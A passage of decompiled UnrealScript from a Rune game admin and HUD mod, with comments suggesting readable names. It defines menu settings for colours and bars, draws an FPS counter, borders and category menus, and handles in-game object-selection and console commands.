                        MenuCategories[X].stcProperty[i] = "Bigfont Gap";
                        MenuCategories[X].propertyName[i] = "int";
                        MenuCategories[X].Value[i] = "bigfontGap";
                        MenuCategories[X].maxValue[i] = 20;
                        MenuCategories[X].minValue[i] = -20;
                        MenuCategories[X].stepValue[i] = 1.0000000;
                        i = i + 1;
                    }
                    MenuCategories[X].stcProperty[i] = "Select color R";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "sR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Select color G";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "sG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Select color B";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "sB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Text color R";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "tR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Text color G";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "tG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Text color B";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "tB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Bar thick";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "barThick";
                    MenuCategories[X].maxValue[i] = 20;
                    MenuCategories[X].minValue[i] = -20;
                    MenuCategories[X].stepValue[i] = 1.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Bar alpha";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "float";
                    MenuCategories[X].Value[i] = "barAlpha";
                    MenuCategories[X].maxValue[i] = 1;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 0.0500000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Bar gap";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "float";
                    MenuCategories[X].Value[i] = "bargap";
                    MenuCategories[X].maxValue[i] = 50;
                    MenuCategories[X].minValue[i] = -60;
                    MenuCategories[X].stepValue[i] = 0.2500000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "bar R";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "barR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "bar G";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "barG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "bar B";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "barB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help. bg. alpha";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "float";
                    MenuCategories[X].Value[i] = "helpAlpha";
                    MenuCategories[X].maxValue[i] = 1;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 0.0500000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help bg. color R";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "HR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help bg. color G";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "HG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help bg. color B";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "HB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help text color R";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "HTR";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help text color G";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "HTG";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Help text color B";
                    MenuCategories[X].Help[i] = "la la la";
                    MenuCategories[X].propertyName[i] = "int";
                    MenuCategories[X].Value[i] = "HTB";
                    MenuCategories[X].maxValue[i] = 255;
                    MenuCategories[X].minValue[i] = 0;
                    MenuCategories[X].stepValue[i] = 5.0000000;
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Copy theme link";
                    MenuCategories[X].Help[i] = "Copies a link to your current design";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "*encode copy";
                    i = i + 1;
                    MenuCategories[X].stcProperty[i] = "Share theme link";
                    MenuCategories[X].Help[i] = "Sends a link to the chat that others can click on to use your design";
                    MenuCategories[X].propertyName[i] = "command";
                    MenuCategories[X].Value[i] = "*encode";
                    i = i + 1;
                }
            }
        }
        MenuCategories[X].count = i;
    }
    return;
}

// This function updates FPS calculations and draws either the demo recording name or the FPS counter on the canvas.
function UpdateFPSAndDrawDisplay(Canvas TargetCanvas)
{
	local string DisplayText;  // Text to display on the canvas (either FPS or demo name)
	local float TimeDelta;     // Time difference since last update

	// Calculate time delta since last FPS update
	TimeDelta = Owner.Level.TimeSeconds - FLT_v6548;
	if (TimeDelta > 0.5)
	{
		// Accumulate time and reset counters if delta exceeds threshold
		FLT_v6547 += TimeDelta;
		FLT_v6549 = Owner.Level.TimeSeconds;
		INT_v6551 = 0;
		FLT_v6548 = Owner.Level.TimeSeconds;
		return;
	}

	// Increment frame counters
	INT_v6550++;
	INT_v6551++;

	// Update FPS calculation every second
	if ((Owner.Level.TimeSeconds - FLT_v6549) > 1.0)
	{
		FLT_v6552 = float(INT_v6551) / (Owner.Level.TimeSeconds - FLT_v6549);
		INT_v6551 = 0;
		FLT_v6549 = Owner.Level.TimeSeconds;
	}

	// Update last update time
	FLT_v6548 = Owner.Level.TimeSeconds;

	// Draw demo recording name if auto demo draw is enabled
	if (bAutoDemoDraw)
	{
		TargetCanvas.Font = TargetCanvas.MedFont;
		TargetCanvas.DrawColor.R = 255;
		TargetCanvas.DrawColor.G = 255;
		TargetCanvas.DrawColor.B = 255;

		if (INT_v6429 != 0)
		{
			DisplayText = Caps(STR_v6427) $ string(INT_v6429);
		}
		else
		{
			DisplayText = Caps(STR_v6427);
		}

		TargetCanvas.SetPos(TargetCanvas.ClipX - 125.0, 0.98 * TargetCanvas.ClipY);
		TargetCanvas.DrawText(DisplayText);
	}
	else
	{
		// Draw FPS if show FPS is enabled
		if (bShowFPS)
		{
			TargetCanvas.Font = TargetCanvas.MedFont;
			TargetCanvas.DrawColor.R = 255;
			TargetCanvas.DrawColor.G = 255;
			TargetCanvas.DrawColor.B = 255;

			DisplayText = "FPS: " $ string(int(FLT_v6552));  // Round FPS to nearest integer
			TargetCanvas.SetPos(TargetCanvas.ClipX - 100.0, 0.98 * TargetCanvas.ClipY);
			TargetCanvas.DrawText(DisplayText);
		}
	}

	return;
}
// Suggested name: DrawBorder
// This function draws a rectangular border on the canvas, with optional skipping of specific sides.
// It uses two helper functions to draw horizontal and vertical lines for the border.
// Parameters:
//   Canvas: The canvas to draw on.
//   X: The X position of the rectangle.
//   Y: The Y position of the rectangle.
//   Width: The width of the rectangle.
//   Height: The height of the rectangle.
//   Thickness: The thickness of the border.
//   BorderColor: The color of the border.
//   SkipSide: Optional parameter to skip drawing a specific side (1=top, 2=right, 3=bottom, 4=left).
function DrawBorder(Canvas Canvas, float X, float Y, float Width, float Height, float Thickness, Color BorderColor, optional int SkipSide)
{
	Canvas.Style = 3;
	Canvas.DrawColor = BorderColor;

	// Draw top border if not skipped
	if (SkipSide != 1)
	{
		DrawHorizontalFilledRect(Canvas, X, Y, Width, Thickness, BorderColor, 0.8);
	}

	// Draw right border if not skipped
	if (SkipSide != 2)
	{
		DrawVerticalFilledRect(Canvas, (X + Width) - Thickness, Y + Thickness, Thickness, Height - (Thickness * 2), BorderColor, 0.8);
	}

	// Draw bottom border if not skipped
	if (SkipSide != 3)
	{
		DrawHorizontalFilledRect(Canvas, X, (Y + Height) - Thickness, Width, Thickness, BorderColor, 0.8);
	}

	// Draw left border if not skipped
	if (SkipSide != 4)
	{
		DrawVerticalFilledRect(Canvas, X, Y + Thickness, Thickness, Height - (Thickness * 2), BorderColor, 0.8);
	}
}
// Suggested name: DrawHorizontalFilledRect
// This function draws a filled horizontal rectangle on the canvas using a pixel texture.
// It sets the canvas style to 5 (translucent), applies alpha scaling, positions the rectangle,
// sets the draw color, and draws a tile of the pixel texture to fill the specified area.
// Finally, it resets the style to 1 (normal).
function DrawHorizontalFilledRect(Canvas Canvas, float X, float Y, float Width, float Height, Color DrawColor, float Alpha)
{
	// Local texture variable (unused in this function, can be removed if not needed elsewhere)
	local Texture UnusedTexture;

	Canvas.Style = 5;
	Canvas.AlphaScale = Alpha;
	Canvas.SetPos(X, Y);
	Canvas.DrawColor = DrawColor;
	Canvas.DrawTile(Texture'coadminz7.Icons.pixel', Width, Height, 0.0, 0.0, 1.0, 1.0);
	Canvas.Style = 1;
	return;
}

// Suggested name: DrawVerticalFilledRect
// This function draws a filled vertical rectangle on the canvas using a pixel texture.
// It sets the canvas style to 5 (translucent), applies alpha scaling, positions the rectangle,
// sets the draw color, and draws a tile of the pixel texture to fill the specified area.
// Finally, it resets the style to 1 (normal).
function DrawVerticalFilledRect(Canvas Canvas, float X, float Y, float Width, float Height, Color DrawColor, float Alpha)
{
	// Local texture variable (unused in this function, can be removed if not needed elsewhere)
	local Texture UnusedTexture;

	Canvas.Style = 5;
	Canvas.AlphaScale = Alpha;
	Canvas.SetPos(X, Y);
	Canvas.DrawColor = DrawColor;
	Canvas.DrawTile(Texture'coadminz7.Icons.pixel', Width, Height, 0.0, 0.0, 1.0, 1.0);
	Canvas.Style = 1;
	return;
}

final function DrawCategoryMenu(coerce string CategoryText, int CategoryIndex, Canvas Canvas, optional bool IsBottomRight)
{
	local int MenuItemIndex;
	local bool IsBooleanValue;
	local float NumericValue;
	local string HelpText;

	if (!IsBottomRight)
	{
		Canvas.SetPos(float(INT_v6451), float(INT_v6450));
	}
	else
	{
		Canvas.SetPos(Canvas.ClipX - float(190), Canvas.ClipY - float(9));
	}

	if (bigFontMenu && !IsBottomRight)
	{
		if (CategoryIndex == gI)
		{
			Canvas.Font = Canvas.BigFont;
			Canvas.SetPos(float(INT_v6451), float(INT_v6450 - bigfontGap));
		}
		else
		{
			Canvas.Font = Canvas.MedFont;
		}
	}

	if (CategoryIndex == gI)
	{
		Canvas.DrawColor = MakeColor(byte(SR), byte(SG), byte(SB));
	}
	else
	{
		Canvas.DrawColor = MakeColor(byte(tr), byte(TG), byte(tB));
	}

	Canvas.DrawText(CategoryText);
	INT_v6450 += (12 + categoryGap);

	if (!B_v6444)
	{
		INT_v6448 = 0;
	}

	if ((((CategoryIndex != 0) && CategoryIndex == gI) && B_v6444) && MenuCategories[CategoryIndex].count != 0)
	{
		if (MenuCategories[CategoryIndex].Help[INT_v6448] != "")
		{
			HelpText = MenuCategories[CategoryIndex].Help[INT_v6448];
		}
		else
		{
			HelpText = "";
		}

		Canvas.Font = Canvas.BigFont;
		DrawStretchedBox(Canvas, helpAlpha, INT_v6451 - 20, (INT_v3204 - 10) - 16, MenuWidth + categoryWidth, 16, MakeColor(byte(HR), byte(hG), byte(hB)));
		Canvas.SetPos(float(INT_v6451), float((INT_v3204 - 10) - 16));
		Canvas.DrawColor = MakeColor(byte(hTR), byte(hTG), byte(hTB));

		if (HelpText != "")
		{
			Canvas.DrawText(HelpText);
		}

		Canvas.Font = Canvas.MedFont;
		DrawStretchedBox(Canvas, menuAlpha, ((INT_v6451 + categoryWidth) - 30) + 10, INT_v3204 - 10, MenuWidth, MenuHeight + (MenuCategories[gI].count * (12 + menuGap)), MakeColor(byte(MR), byte(MG), byte(MB)));
		DrawVerticalFilledRect(Canvas, float(((INT_v6451 + categoryWidth) - 30) + 10), float(INT_v3204 - 10), 5.0000000, float(MenuHeight + (MenuCategories[gI].count * (12 + menuGap))), MakeColor(byte(HR), byte(hG), byte(hB)), 0.1500000);
		DrawHorizontalFilledRect(Canvas, float(((INT_v6451 + categoryWidth) - 30) + 15), float(((INT_v3204 - 15) + MenuHeight) + ((INT_v6448 - 1) * (12 + menuGap))), float(MenuWidth - 5), 17.0000000, MakeColor(byte(HR), byte(hG), byte(hB)), 0.1500000);

		MenuItemIndex = 0;

		while (MenuItemIndex <= MenuCategories[CategoryIndex].count)
		{
			if ((MenuCategories[CategoryIndex].propertyName[MenuItemIndex] != "float") && MenuCategories[CategoryIndex].propertyName[MenuItemIndex] != "int")
			{
				if (GetPropertyText(MenuCategories[CategoryIndex].propertyName[MenuItemIndex]) ~= (Localize("General", "True", "Core")))
				{
					IsBooleanValue = true;
				}
				else
				{
					IsBooleanValue = false;
				}
			}
			else
			{
				NumericValue = float(GetPropertyText(MenuCategories[CategoryIndex].Value[MenuItemIndex]));
			}

			if (MenuCategories[CategoryIndex].controlStyle[MenuItemIndex] > 0)
			{
				if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Date format")
				{
					DrawMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], IsBooleanValue, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Donate $$$")
				{
					DrawMenuText(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Destroyable")
				{
					DrawDestroyableMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Static")
				{
					DrawStaticMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "NoDelete")
				{
					DrawNoDeleteMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Stasis")
				{
					DrawStasisMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "DrawScale")
				{
					DrawDrawScaleMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "AlphaScale")
				{
					DrawAlphaScaleMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (((INT_v6439 == 1) && A_v6593 != none) && (GetDelimitedPart(MenuCategories[CategoryIndex].Value[MenuItemIndex], 1)) ~= "skelFlag")
				{
					DrawSkelGroupFlagMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], float(int(GetDelimitedPart(MenuCategories[CategoryIndex].Value[MenuItemIndex], 2))), true, MenuItemIndex, Canvas);
				}
				else if (((INT_v6439 == 2) && A_v6593 != none) && (GetDelimitedPart(MenuCategories[CategoryIndex].Value[MenuItemIndex], 1)) ~= "jointFlag")
				{
					DrawJointFlagMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], float(int(GetDelimitedPart(MenuCategories[CategoryIndex].Value[MenuItemIndex], 2))), true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Name")
				{
					DrawActorTagMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Event")
				{
					DrawActorEventMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Fatness")
				{
					DrawFatnessMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].Value[MenuItemIndex] == "collisionheight")
				{
					DrawCollisionPropertyMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, 1, Canvas);
				}
				else if (MenuCategories[CategoryIndex].Value[MenuItemIndex] == "collisionradius")
				{
					DrawCollisionPropertyMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, 2, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Draw style")
				{
					DrawDrawStyleMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Map theme")
				{
					DrawMapThemeMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Soundname")
				{
					DrawSoundNameMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Color (R)")
				{
					DrawColorComponentMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, 1, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Color (G)")
				{
					DrawColorComponentMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, 2, Canvas);
				}
				else if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "Color (B)")
				{
					DrawColorComponentMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, 3, Canvas);
				}
				else if (MenuCategories[CategoryIndex].Value[MenuItemIndex] == "tauntID")
				{
					DrawMenuValueItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].Value[MenuItemIndex] == "chatFont")
				{
					DrawChatFontMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], MenuItemIndex, Canvas);
				}
				else if (MenuCategories[CategoryIndex].Value[MenuItemIndex] == "selectedObjectID")
				{
					DrawSelectedObjectMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
				}
				else if ((((((((MenuCategories[CategoryIndex].Value[MenuItemIndex] == "consoletransparency") 
				|| MenuCategories[CategoryIndex].Value[MenuItemIndex] == "cineSmoothing") 
				|| MenuCategories[CategoryIndex].Value[MenuItemIndex] == "soundVolume") 
				|| MenuCategories[CategoryIndex].Value[MenuItemIndex] == "bloodDensity") 
				|| MenuCategories[CategoryIndex].controlStyle[MenuItemIndex] == 2)
				|| MenuCategories[CategoryIndex].controlStyle[MenuItemIndex] == 3) 
				|| MenuCategories[CategoryIndex].controlStyle[MenuItemIndex] == 4) 
				|| MenuCategories[CategoryIndex].controlStyle[MenuItemIndex] == 5)
				{
					DrawSliderMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, MenuCategories[CategoryIndex].minValue[MenuItemIndex], MenuCategories[CategoryIndex].maxValue[MenuItemIndex], int(MenuCategories[CategoryIndex].stepValue[MenuItemIndex]), MenuItemIndex, Canvas, MenuCategories[CategoryIndex].defaultFloat[MenuItemIndex], MenuCategories[CategoryIndex].controlStyle[MenuItemIndex]);
				}
			}
			else if (MenuCategories[CategoryIndex].propertyName[MenuItemIndex] == "int")
			{
				DrawNumericMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, true, MenuItemIndex, Canvas);
			}
			else if (MenuCategories[CategoryIndex].propertyName[MenuItemIndex] == "float")
			{
				DrawNumericMenuItem(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, false, MenuItemIndex, Canvas);
			}
			else if (MenuCategories[CategoryIndex].propertyName[MenuItemIndex] == "command")
			{
				DrawMenuCommandText(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], NumericValue, false, MenuItemIndex, Canvas);
			}
			else if (MenuCategories[CategoryIndex].Value[MenuItemIndex] == "/")
			{
				if (MenuCategories[CategoryIndex].stcProperty[MenuItemIndex] == "<-")
				{
					DrawBackMenuItem(MenuItemIndex, Canvas);
				}
				else
				{
					eqN_vxv_2482(MenuCategories[CategoryIndex].stcProperty[MenuItemIndex], IsBooleanValue, MenuItemIndex, Canvas);
				}
			}

			MenuItemIndex++;
		}
	}
	return;
}

// Suggested name: SetJointVelocity
exec function jointfuck(int VelX, int VelY, int VelZ)
{
    // This function sets the velocity of a joint.

    local bool bUseOwnerVelocity;
    local Vector JointVelocity;

    JointVelocity.X = float(VelX);
    JointVelocity.Y = float(VelY);
    JointVelocity.Z = float(VelZ);

    if (JointVelocity == vect(0.0, 0.0, 0.0))
    {
        bUseOwnerVelocity = true;
        JointVelocity = Owner.Velocity;
    }

    Owner.ClientMessage(string(JointVelocity) @ string(bUseOwnerVelocity));
    ZRunePlayer(Owner).sMove(float(whichJoint), "jointV", A_v6593, JointVelocity);
}
// Suggested name: HandleObjectManipulation
function HandleObjectManipulation(string CommandName, bool IsIncrement)
{
	local Decoration ClosestDecoration, TempDecoration;
	local Actor ClosestActor, TempActor;
	local ParticleSystem ClosestParticleSystem, TempParticleSystem;
	local Inventory ClosestInventory, TempInventory;
	local Pawn ClosestPawn, TempPawn;
	local float ClosestDistance, TempDistance;
	local int RotationIncrement, PositionIncrement;
	local float TempFloat;
	local bool TempBool;
	local int TempInt;
	local Vector TempVector;

	// Determine increments based on direction
	if (IsIncrement)
	{
		RotationIncrement = rotIncDec * 182;
	}
	else
	{
		RotationIncrement = -rotIncDec * 182;
	}
	if (IsIncrement)
	{
		PositionIncrement = posIncDec;
	}
	else
	{
		PositionIncrement = -posIncDec;
	}

	// Toggle test mode
	if (CommandName ~= "toggletest")
	{
		INT_v6439++;
	}
	if (INT_v6439 > 2)
	{
		INT_v6439 = 0;
	}

	// Set weapon color
	if ((CommandName ~= "wear") || (CommandName ~= "weag") || (CommandName ~= "weab"))
	{
		Owner.Weapon.DesiredColorAdjust.X = weaR;
		Owner.Weapon.DesiredColorAdjust.Y = weaG;
		Owner.Weapon.DesiredColorAdjust.Z = weaB;
	}

	// Open donation link
	if (CommandName ~= "donate")
	{
		Viewport.Actor.ConsoleCommand("start http://bit.ly/coadminz_donate");
	}

	// Open forum link
	if (CommandName ~= "forum")
	{
		Viewport.Actor.ConsoleCommand("start http://therune.boards.net");
	}

	// Play sound
	if (CommandName ~= "playmahsound")
	{
		Viewport.Actor.PlaySound(UNK_v6410, 5, SoundVolume, soundNoOverWrite, SoundRadius, SoundPitch);
	}

	// Play custom sound
	if (CommandName ~= "playmahsound2")
	{
		ZRunePlayer(Viewport.Actor).PlayCustomSound(STR_v6411, SoundVolume, soundNoOverWrite, SoundRadius, SoundPitch);
	}

	// Send settings if admin
	if ((CommandName ~= "sendSettings") && zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Local_int_v2 == 1337)
	{
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UpdateMOTDGapSizes(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5356, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5357, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).INT_v5358);
		zPlayerReplicationInfo(Owner.PlayerReplicationInfo).UpdateMOTDColors(zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5372, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).Col_v5373, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).titlecolor, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).AdminColor, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).EmailColor, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD1Color, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD2Color, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD3Color, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).MOTD4Color, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).SeperatorColor, zPlayerReplicationInfo(Owner.PlayerReplicationInfo).HeadingsColor);
	}

	// Handle typing commands
	if (Left(CommandName, 1) == "-")
	{
		TypedStr = RemoveFirstChar(CommandName);
		INT_v6678 = Len(TypedStr);
		bNoStuff = true;
		INT_v6715 = 2;
		bTyping = true;
		Viewport.Actor.Typing(bTyping);
	}

	// Execute console command
	if (Left(CommandName, 1) == "*")
	{
		Owner.ConsoleCommand(RemoveFirstChar(CommandName));
	}

	// Find closest decoration
	if (CommandName == "closestobject")
	{
		ClosestDistance = 1000000000.0;
		ClosestDecoration = none;
		foreach Owner.Level.AllActors(Class'Engine.Decoration', TempDecoration)
		{
			TempDistance = VSize(TempDecoration.Location - Owner.Location);
			if ((TempDistance < ClosestDistance) && TempDecoration != A_v6593)
			{
				ClosestDistance = TempDistance;
				ClosestDecoration = TempDecoration;
			}
		}
		if (ClosestDecoration != none)
		{
			A_v6593 = ClosestDecoration;
		}
		else
		{
			Owner.ClientMessage("Didn't find any object.");
		}
	}

	// Find closest info actor
	if (CommandName == "closestinfo")
	{
		ClosestDistance = 1000000000.0;
		ClosestActor = none;
		foreach Owner.Level.AllActors(Class'Engine.Actor', TempActor)
		{
			if (TempActor.IsA('Info'))
			{
				TempDistance = VSize(TempActor.Location - Owner.Location);
				if ((TempDistance < ClosestDistance) && TempActor != A_v6593)
				{
					ClosestDistance = TempDistance;
					ClosestActor = TempActor;
				}
			}
		}
		if (ClosestActor != none)
		{
			A_v6593 = ClosestActor;
		}
		else
		{
			Owner.ClientMessage("Didn't find any info class.");
		}
	}

	// Find closest trigger/mover
	if (CommandName == "closesttrigger")
	{
		ClosestDistance = 1000000000.0;
		ClosestActor = none;
		foreach Owner.Level.AllActors(Class'Engine.Actor', TempActor)
		{
			if ((TempActor.IsA('Mover') || TempActor.IsA('Polyobj')) || TempActor.IsA('Trigger'))
			{
				TempDistance = VSize(TempActor.Location - Owner.Location);
				if ((TempDistance < ClosestDistance) && TempActor != A_v6593)
				{
					ClosestDistance = TempDistance;
					ClosestActor = TempActor;
				}
			}
		}
		if (ClosestActor != none)
		{
			A_v6593 = ClosestActor;
		}
		else
		{
			Owner.ClientMessage("Didn't find any trigger/mover.");
		}
	}

	// Find closest particle system
	if (CommandName == "closestparticle")
	{
		ClosestDistance = 1000000000.0;
		ClosestParticleSystem = none;
		foreach Owner.Level.AllActors(Class'Engine.ParticleSystem', TempParticleSystem)
		{
			TempDistance = VSize(TempParticleSystem.Location - Owner.Location);
			if ((TempDistance < ClosestDistance) && TempParticleSystem != A_v6593)
			{
				ClosestDistance = TempDistance;
				ClosestParticleSystem = TempParticleSystem;
			}
		}
